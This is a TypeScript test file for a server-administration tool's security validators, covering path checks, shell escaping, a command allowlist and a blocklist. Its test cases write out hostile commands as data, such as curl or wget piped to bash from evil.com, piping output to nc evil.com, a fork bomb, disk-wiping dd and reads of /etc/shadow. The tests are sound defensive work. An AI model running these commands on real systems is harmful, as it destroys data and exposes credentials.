// M5.1+M5.5: Comprehensive security validator tests
// @see docs/SECURITY.md

import { describe, it, expect } from 'vitest';
import {
  validatePath,
  validateAndSanitizePath,
  validateContainerId,
  validateDockerImageRef,
  validatePid,
  validateSignal,
  validateServiceName,
  validateISODate,
  validateLogSource,
  validatePositiveInt,
  shellEscape,
  validateCommand,
  matchAllowedCommand,
  isBlockedCommand,
  SecurityError,
  sanitizeErrorMessage,
  ALLOWED_COMMANDS,
  BLOCKED_COMMANDS,
} from '../../src/security/validators';

// ---------------------------------------------------------------------------
// Path Validation
// ---------------------------------------------------------------------------

describe('validatePath (boolean)', () => {
  it('accepts valid absolute paths', () => {
    expect(validatePath('/')).toBe(true);
    expect(validatePath('/home')).toBe(true);
    expect(validatePath('/home/user/documents')).toBe(true);
    expect(validatePath('/var/log/syslog')).toBe(true);
    expect(validatePath('/tmp/file.txt')).toBe(true);
  });

  it('rejects relative paths', () => {
    expect(validatePath('home/user')).toBe(false);
    expect(validatePath('file.txt')).toBe(false);
    expect(validatePath('./relative')).toBe(false);
  });

  it('rejects null bytes', () => {
    expect(validatePath('/home/user\0')).toBe(false);
    expect(validatePath('/tmp/file\0.txt')).toBe(false);
  });

  it('rejects empty and invalid input', () => {
    expect(validatePath('')).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(undefined)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validatePath(123)).toBe(false);
  });

  it('rejects blocked paths', () => {
    expect(validatePath('/proc/sysrq-trigger')).toBe(false);
    expect(validatePath('/dev/sda')).toBe(false);
    expect(validatePath('/dev/sda1')).toBe(false);
  });
});

describe('validateAndSanitizePath', () => {
  it('returns normalized path for valid input', () => {
    expect(validateAndSanitizePath('/home/user')).toBe('/home/user');
    expect(validateAndSanitizePath('/home/user//docs')).toBe('/home/user/docs');
    expect(validateAndSanitizePath('/home/user/./docs')).toBe('/home/user/docs');
  });

  it('throws SecurityError for relative paths', () => {
    expect(() => validateAndSanitizePath('relative/path')).toThrow(SecurityError);
    expect(() => validateAndSanitizePath('relative/path')).toThrow('Path must be absolute');
  });

  it('throws SecurityError for traversal attacks', () => {
    expect(() => validateAndSanitizePath('../../etc/passwd')).toThrow(SecurityError);
  });

  it('throws SecurityError for null bytes', () => {
    expect(() => validateAndSanitizePath('/home\0bypass')).toThrow('Null byte in path');
  });

  it('throws SecurityError for blocked paths', () => {
    expect(() => validateAndSanitizePath('/proc/sysrq-trigger')).toThrow('restricted');
    expect(() => validateAndSanitizePath('/dev/sda')).toThrow('restricted');
  });

  it('throws SecurityError for empty input', () => {
    expect(() => validateAndSanitizePath('')).toThrow(SecurityError);
  });

  it('normalizes paths with resolved traversal that remains valid', () => {
    // /home/../etc/passwd normalizes to /etc/passwd (no .. left) — valid
    expect(validateAndSanitizePath('/home/../etc/passwd')).toBe('/etc/passwd');
  });
});

// ---------------------------------------------------------------------------
// Container ID Validation
// ---------------------------------------------------------------------------

describe('validateContainerId', () => {
  it('accepts valid hex container IDs (12-64 chars)', () => {
    expect(validateContainerId('abc123def456')).toBe(true);       // 12 chars
    expect(validateContainerId('deadbeefcafe')).toBe(true);       // 12 chars
    expect(validateContainerId('1234567890abcdef')).toBe(true);   // 16 chars
    expect(validateContainerId('a'.repeat(64))).toBe(true);       // 64 chars (full SHA)
  });

  it('rejects IDs shorter than 12 characters', () => {
    expect(validateContainerId('abc123')).toBe(false);            // 6 chars
    expect(validateContainerId('deadbeef')).toBe(false);          // 8 chars
    expect(validateContainerId('abc123def45')).toBe(false);       // 11 chars
  });

  it('rejects IDs longer than 64 characters', () => {
    expect(validateContainerId('a'.repeat(65))).toBe(false);
  });

  it('rejects non-hex characters', () => {
    expect(validateContainerId('xyz123456789')).toBe(false);
    expect(validateContainerId('abc-12345678')).toBe(false);
    expect(validateContainerId('ABC123456789')).toBe(false);      // uppercase not allowed
    expect(validateContainerId('')).toBe(false);
  });

  it('rejects injection attempts', () => {
    expect(validateContainerId('abc123456789; rm -rf /')).toBe(false);
    expect(validateContainerId('abc123456789$(whoami)')).toBe(false);
    expect(validateContainerId('abc12345678`id`')).toBe(false);
  });

  it('rejects null/undefined', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateContainerId(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateContainerId(undefined)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Docker Image Reference Validation
// ---------------------------------------------------------------------------

describe('validateDockerImageRef', () => {
  it('accepts valid image references', () => {
    expect(validateDockerImageRef('nginx')).toBe(true);
    expect(validateDockerImageRef('nginx:latest')).toBe(true);
    expect(validateDockerImageRef('nginx:1.25')).toBe(true);
    expect(validateDockerImageRef('docker.io/library/nginx:latest')).toBe(true);
    expect(validateDockerImageRef('ghcr.io/user/repo:v1.2.3')).toBe(true);
    expect(validateDockerImageRef('my-registry.com:5000/app:v2')).toBe(true);
  });

  it('rejects shell metacharacters', () => {
    expect(validateDockerImageRef('nginx; rm -rf /')).toBe(false);
    expect(validateDockerImageRef('nginx$(whoami)')).toBe(false);
    expect(validateDockerImageRef('image`id`')).toBe(false);
    expect(validateDockerImageRef('nginx | cat /etc/passwd')).toBe(false);
    expect(validateDockerImageRef('image&& echo hacked')).toBe(false);
  });

  it('rejects images exceeding max length', () => {
    expect(validateDockerImageRef('a'.repeat(257))).toBe(false);
  });

  it('rejects empty or invalid starts', () => {
    expect(validateDockerImageRef('')).toBe(false);
    expect(validateDockerImageRef('.hidden')).toBe(false);
    expect(validateDockerImageRef('-prefixed')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// PID Validation
// ---------------------------------------------------------------------------

describe('validatePid', () => {
  it('accepts valid PIDs', () => {
    expect(validatePid('1')).toBe(true);           // init
    expect(validatePid('12345')).toBe(true);
    expect(validatePid('32768')).toBe(true);
    expect(validatePid('4194304')).toBe(true);      // max on 64-bit
  });

  it('rejects PID 0', () => {
    expect(validatePid('0')).toBe(false);
  });

  it('rejects PIDs above max', () => {
    expect(validatePid('4194305')).toBe(false);
    expect(validatePid('99999999')).toBe(false);
  });

  it('rejects non-numeric values', () => {
    expect(validatePid('')).toBe(false);
    expect(validatePid('abc')).toBe(false);
    expect(validatePid('12.5')).toBe(false);
    expect(validatePid('-1')).toBe(false);
    expect(validatePid('1; rm -rf /')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Signal Validation
// ---------------------------------------------------------------------------

describe('validateSignal', () => {
  it('accepts valid signals (1-31)', () => {
    expect(validateSignal(1)).toBe(true);    // SIGHUP
    expect(validateSignal(9)).toBe(true);    // SIGKILL
    expect(validateSignal(15)).toBe(true);   // SIGTERM
    expect(validateSignal(31)).toBe(true);
  });

  it('rejects out-of-range signals', () => {
    expect(validateSignal(0)).toBe(false);
    expect(validateSignal(32)).toBe(false);
    expect(validateSignal(-1)).toBe(false);
    expect(validateSignal(100)).toBe(false);
  });

  it('rejects non-integers', () => {
    expect(validateSignal(1.5)).toBe(false);
    expect(validateSignal(NaN)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateSignal('9')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Service Name Validation
// ---------------------------------------------------------------------------

describe('validateServiceName', () => {
  it('accepts valid service names', () => {
    expect(validateServiceName('nginx')).toBe(true);
    expect(validateServiceName('my-service')).toBe(true);
    expect(validateServiceName('my_service')).toBe(true);
    expect(validateServiceName('service.name')).toBe(true);
    expect(validateServiceName('app2')).toBe(true);
    expect(validateServiceName('getty@tty1.service')).toBe(true);  // template unit
    expect(validateServiceName('sshd')).toBe(true);
  });

  it('rejects service names exceeding 256 characters', () => {
    expect(validateServiceName('a'.repeat(257))).toBe(false);
  });

  it('accepts service names up to 256 characters', () => {
    expect(validateServiceName('a'.repeat(256))).toBe(true);
  });

  it('rejects invalid characters', () => {
    expect(validateServiceName('')).toBe(false);
    expect(validateServiceName('my service')).toBe(false);     // spaces
    expect(validateServiceName('$(whoami)')).toBe(false);
    expect(validateServiceName('nginx; rm -rf /')).toBe(false);
    expect(validateServiceName('a/b')).toBe(false);
    expect(validateServiceName('service|pipe')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// ISO Date Validation
// ---------------------------------------------------------------------------

describe('validateISODate', () => {
  it('accepts valid ISO date strings', () => {
    expect(validateISODate('2024-01-15')).toBe(true);
    expect(validateISODate('2024-12-31T23:59:59')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00Z')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00+05:30')).toBe(true);
    expect(validateISODate('2024-01-15T10:30:00-08:00')).toBe(true);
  });

  it('rejects dates with injection payload', () => {
    expect(validateISODate('2024-01-01; rm -rf /')).toBe(false);
    expect(validateISODate('2024-01-01$(whoami)')).toBe(false);
    expect(validateISODate('2024-01-01`id`')).toBe(false);
  });

  it('rejects invalid date formats', () => {
    expect(validateISODate('')).toBe(false);
    expect(validateISODate('not-a-date')).toBe(false);
    expect(validateISODate('01-15-2024')).toBe(false);
    expect(validateISODate('2024/01/15')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Log Source Validation
// ---------------------------------------------------------------------------

describe('validateLogSource', () => {
  it('accepts valid log sources', () => {
    expect(validateLogSource('journal')).toBe(true);
    expect(validateLogSource('dmesg')).toBe(true);
    expect(validateLogSource('syslog')).toBe(true);
  });

  it('rejects invalid log sources', () => {
    expect(validateLogSource('invalid')).toBe(false);
    expect(validateLogSource('')).toBe(false);
    expect(validateLogSource('Journal')).toBe(false);  // case-sensitive
    expect(validateLogSource('kern.log')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Positive Integer Validation
// ---------------------------------------------------------------------------

describe('validatePositiveInt', () => {
  it('accepts valid positive integers within range', () => {
    expect(validatePositiveInt('1')).toBe(true);
    expect(validatePositiveInt('100')).toBe(true);
    expect(validatePositiveInt('10000')).toBe(true);
  });

  it('rejects zero and negative values', () => {
    expect(validatePositiveInt('0')).toBe(false);
    expect(validatePositiveInt('-1')).toBe(false);
  });

  it('rejects values above max', () => {
    expect(validatePositiveInt('10001')).toBe(false);
    expect(validatePositiveInt('5', 4)).toBe(false);
  });

  it('respects custom max', () => {
    expect(validatePositiveInt('50', 100)).toBe(true);
    expect(validatePositiveInt('101', 100)).toBe(false);
  });

  it('rejects non-numeric values', () => {
    expect(validatePositiveInt('')).toBe(false);
    expect(validatePositiveInt('abc')).toBe(false);
    expect(validatePositiveInt('12.5')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Shell Escaping
// ---------------------------------------------------------------------------

describe('shellEscape', () => {
  it('wraps strings in single quotes', () => {
    expect(shellEscape('hello')).toBe("'hello'");
    expect(shellEscape('/home/user')).toBe("'/home/user'");
  });

  it('escapes single quotes within strings', () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
    expect(shellEscape("O'Brien")).toBe("'O'\\''Brien'");
  });

  it('handles empty strings', () => {
    expect(shellEscape('')).toBe("''");
  });

  it('neutralizes injection attempts', () => {
    const malicious = "'; rm -rf /; echo '";
    const escaped = shellEscape(malicious);
    expect(escaped.startsWith("'")).toBe(true);
    expect(escaped.endsWith("'")).toBe(true);
    expect(escaped).toContain("\\'");
  });

  it('handles non-string input gracefully', () => {
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(null)).toBe("''");
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(undefined)).toBe("''");
    // @ts-expect-error — testing runtime safety
    expect(shellEscape(123)).toBe("''");
  });

  it('handles strings with backticks', () => {
    expect(shellEscape('hello`whoami`world')).toBe("'hello`whoami`world'");
  });

  it('handles strings with dollar signs', () => {
    expect(shellEscape('$HOME')).toBe("'$HOME'");
    expect(shellEscape('$(whoami)')).toBe("'$(whoami)'");
  });

  it('handles strings with semicolons', () => {
    expect(shellEscape('cmd; evil')).toBe("'cmd; evil'");
  });
});

// ---------------------------------------------------------------------------
// Command Allowlist
// ---------------------------------------------------------------------------

describe('matchAllowedCommand', () => {
  it('matches system info commands', () => {
    expect(matchAllowedCommand('hostname')).not.toBeNull();
    expect(matchAllowedCommand('uptime')).not.toBeNull();
    expect(matchAllowedCommand('uname -a')).not.toBeNull();
    expect(matchAllowedCommand('df -h')).not.toBeNull();
    expect(matchAllowedCommand('free -m')).not.toBeNull();
    expect(matchAllowedCommand('ps aux')).not.toBeNull();
    expect(matchAllowedCommand('cat /proc/cpuinfo')).not.toBeNull();
  });

  it('matches docker commands', () => {
    expect(matchAllowedCommand('docker ps')).not.toBeNull();
    expect(matchAllowedCommand('docker ps -a')).not.toBeNull();
    expect(matchAllowedCommand('docker images')).not.toBeNull();
    expect(matchAllowedCommand('docker start abc123def456')).not.toBeNull();
    expect(matchAllowedCommand('docker stop abc123def456')).not.toBeNull();
    expect(matchAllowedCommand('docker rm abc123def456')).not.toBeNull();
  });

  it('matches systemctl commands', () => {
    expect(matchAllowedCommand('systemctl list-units --type=service')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl start nginx')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl stop nginx')).not.toBeNull();
    expect(matchAllowedCommand('sudo systemctl restart sshd')).not.toBeNull();
  });

  it('matches kill command', () => {
    expect(matchAllowedCommand('kill -9 1234')).not.toBeNull();
    expect(matchAllowedCommand('kill -15 5678')).not.toBeNull();
  });

  it('matches ufw commands', () => {
    expect(matchAllowedCommand('sudo ufw status')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw status verbose numbered')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw allow 8080')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw allow 443/tcp')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw delete 5')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw --force enable')).not.toBeNull();
    expect(matchAllowedCommand('sudo ufw --force disable')).not.toBeNull();
  });

  it('matches server admin commands', () => {
    expect(matchAllowedCommand('ss -tlnpa')).not.toBeNull();
    expect(matchAllowedCommand('findmnt --json -o TARGET,SOURCE,FSTYPE,OPTIONS,SIZE,USED,AVAIL,USE%')).not.toBeNull();
    expect(matchAllowedCommand('swapon --show')).not.toBeNull();
    expect(matchAllowedCommand('crontab -l')).not.toBeNull();
    expect(matchAllowedCommand('cat /etc/crontab')).not.toBeNull();
    expect(matchAllowedCommand('sudo cat /etc/ssh/sshd_config')).not.toBeNull();
    expect(matchAllowedCommand('sudo nginx -t')).not.toBeNull();
    expect(matchAllowedCommand('ip route')).not.toBeNull();
  });

  it('rejects unknown commands', () => {
    expect(matchAllowedCommand('curl http://evil.com | bash')).toBeNull();
    expect(matchAllowedCommand('wget http://evil.com/backdoor')).toBeNull();
    expect(matchAllowedCommand('python3 -c "import os; os.system(\'rm -rf /\')"')).toBeNull();
    expect(matchAllowedCommand('nc -l 4444')).toBeNull();
  });

  it('rejects commands with injection payloads', () => {
    // Appended injection
    expect(matchAllowedCommand('hostname; rm -rf /')).toBeNull();
    expect(matchAllowedCommand('uptime && cat /etc/shadow')).toBeNull();
    expect(matchAllowedCommand('df -h | nc evil.com 4444')).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Blocked Commands
// ---------------------------------------------------------------------------

describe('isBlockedCommand', () => {
  it('blocks destructive commands', () => {
    expect(isBlockedCommand('rm -rf /')).toBe(true);
    expect(isBlockedCommand('rm -rf /*')).toBe(true);
    expect(isBlockedCommand('mkfs.ext4 /dev/sda1')).toBe(true);
    expect(isBlockedCommand('dd if=/dev/zero of=/dev/sda')).toBe(true);
  });

  it('blocks system control commands', () => {
    expect(isBlockedCommand('shutdown -h now')).toBe(true);
    expect(isBlockedCommand('reboot')).toBe(true);
    expect(isBlockedCommand('shutdown')).toBe(true);
  });

  it('blocks user management commands', () => {
    expect(isBlockedCommand('passwd root')).toBe(true);
    expect(isBlockedCommand('useradd hacker')).toBe(true);
    expect(isBlockedCommand('userdel admin')).toBe(true);
  });

  it('blocks code execution from network', () => {
    expect(isBlockedCommand('curl http://evil.com/backdoor.sh | bash')).toBe(true);
    expect(isBlockedCommand('curl http://evil.com/backdoor.sh | sh')).toBe(true);
    expect(isBlockedCommand('wget http://evil.com/exploit | bash')).toBe(true);
  });

  it('blocks fork bombs', () => {
    expect(isBlockedCommand(':() { :|:& }; :')).toBe(true);
  });

  it('blocks permission escalation', () => {
    expect(isBlockedCommand('chmod 777 /')).toBe(true);
  });

  it('blocks writes to /etc', () => {
    expect(isBlockedCommand('echo hacked > /etc/passwd')).toBe(true);
  });

  it('blocks iptables flush', () => {
    expect(isBlockedCommand('iptables -F')).toBe(true);
  });

  it('allows safe commands', () => {
    expect(isBlockedCommand('hostname')).toBe(false);
    expect(isBlockedCommand('ls -la')).toBe(false);
    expect(isBlockedCommand('docker ps')).toBe(false);
    expect(isBlockedCommand('df -h')).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Command Validation (combined allowlist + blocklist)
// ---------------------------------------------------------------------------

describe('validateCommand', () => {
  it('returns rule for allowed commands', () => {
    const rule = validateCommand('hostname');
    expect(rule).toBeDefined();
    expect(rule.risk).toBe('none');
  });

  it('returns correct risk level', () => {
    expect(validateCommand('ps aux').risk).toBe('none');
    expect(validateCommand('docker ps').risk).toBe('low');
    expect(validateCommand('docker stop abc123def456').risk).toBe('medium');
    expect(validateCommand('docker rm abc123def456').risk).toBe('high');
  });

  it('throws SecurityError for blocked commands', () => {
    expect(() => validateCommand('rm -rf /')).toThrow(SecurityError);
    expect(() => validateCommand('rm -rf /')).toThrow('Blocked command');
  });

  it('throws SecurityError for unknown commands', () => {
    expect(() => validateCommand('curl http://evil.com')).toThrow(SecurityError);
    expect(() => validateCommand('curl http://evil.com')).toThrow('not in allowlist');
  });

  it('throws SecurityError for empty input', () => {
    expect(() => validateCommand('')).toThrow(SecurityError);
    // @ts-expect-error — testing runtime safety
    expect(() => validateCommand(null)).toThrow(SecurityError);
  });

  it('blocklist takes precedence over allowlist', () => {
    // Even if 'shutdown' somehow matched an allowlist pattern, blocklist wins
    expect(() => validateCommand('shutdown -h now')).toThrow(SecurityError);
  });
});

// ---------------------------------------------------------------------------
// Error Sanitization
// ---------------------------------------------------------------------------

describe('sanitizeErrorMessage', () => {
  it('redacts file paths', () => {
    const result = sanitizeErrorMessage('Error: cannot open /etc/shadow');
    expect(result).not.toContain('/etc/shadow');
    expect(result).toContain('[path]');
  });

  it('redacts IP addresses', () => {
    const result = sanitizeErrorMessage('Connection to 192.168.1.100 refused');
    expect(result).not.toContain('192.168.1.100');
    expect(result).toContain('[ip]');
  });

  it('truncates long messages', () => {
    const long = 'a'.repeat(1000);
    const result = sanitizeErrorMessage(long);
    expect(result.length).toBeLessThanOrEqual(503); // 500 + "..."
  });

  it('handles empty/null input', () => {
    expect(sanitizeErrorMessage('')).toBe('An unknown error occurred');
    // @ts-expect-error — testing runtime safety
    expect(sanitizeErrorMessage(null)).toBe('An unknown error occurred');
  });
});

// ---------------------------------------------------------------------------
// Constants integrity checks
// ---------------------------------------------------------------------------

describe('Security constants', () => {
  it('ALLOWED_COMMANDS has expected minimum entries', () => {
    expect(ALLOWED_COMMANDS.size).toBeGreaterThanOrEqual(40);
  });

  it('BLOCKED_COMMANDS has expected minimum entries', () => {
    expect(BLOCKED_COMMANDS.length).toBeGreaterThanOrEqual(15);
  });

  it('no overlap: docker stop with valid ID should be allowed, not blocked', () => {
    const cmd = 'docker stop abc123def456';
    expect(matchAllowedCommand(cmd)).not.toBeNull();
    expect(isBlockedCommand(cmd)).toBe(false);
  });
});
